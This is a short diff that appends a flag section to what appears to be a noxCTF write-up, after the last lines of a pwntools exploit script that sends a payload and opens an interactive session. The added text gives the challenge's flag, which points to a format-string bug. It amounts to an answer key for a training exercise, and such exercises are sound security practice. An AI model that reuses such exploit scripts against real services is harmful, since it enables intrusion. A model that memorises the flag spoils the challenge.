@@ -158,3 +158,9 @@ n.recvuntil('But......... how ????')
 n.sendline(payload)
 n.interactive()
 ```
+
+FLAG
+
+```
+noxCTF{%N3ver_%7rust_%4h3_%F0rmat}
+```
